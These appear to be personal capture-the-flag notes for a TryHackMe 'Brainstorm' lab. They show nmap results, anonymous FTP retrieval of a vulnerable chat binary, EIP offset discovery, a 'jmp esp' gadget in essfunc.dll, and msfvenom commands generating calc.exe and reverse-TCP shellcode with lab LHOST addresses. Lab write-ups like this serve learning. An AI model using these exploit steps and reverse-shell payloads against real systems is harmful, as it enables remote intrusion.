# enumerate
* scan

21/tcp   open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-09T20:54:55+00:00; -2s from scanner time.
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=5/9%Time=5EB717BE%P=x86_64-pc-linux-gnu%r(NUL
...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s

# Enumerate
FTP with anonymous user
get the exe file and the dll 
Didn't work, have to issue binary command on FTP and then it does.
Needed win10_x86 machine
Run on windows and attach with immunity. 

# Test Foodhold
* crash program
see that long messages crash. 
Find how many characters for EIP offset
  * get the offset from crashing on test vm

* create payload
find a way to control without aslr via essfunc
      '''
	pat@kali:~/Desktop/Cert_Prep/thm/brainstorm$ ROPgadget --binary essfunc.dll | grep "jmp esp"
	0x625014df : jmp esp
	0x625014dd : mov ebp, esp ; jmp esp
	0x625014dc : push ebp ; mov ebp, esp ; jmp esp
      '''
Ok, can jump to that function that jumps to esp. Figure out esp is next so jump esp; shellcode right after. should work
Get calc.exe shellcode -> pat@kali:~/Desktop/Cert_Prep/thm/brainstorm$ msfvenom -f python -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\x00\x0a' EXITFUNC=thread
Worked. 

* get shell
Get reverse shell -> msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.8 LPORT=1234 -f python -e x86/shikata_ga_nai -b "\x00\x0A" EXITFUNC=thread
Worked. 

# Deploy Foothold
msfvenom -p windows/shell/reverse_tcp LHOST=10.11.2.238 LPORT=1234 -f python -e x86/shikata_ga_nai -b "\x00\x0A" EXITFUNC=thread
works, get flag


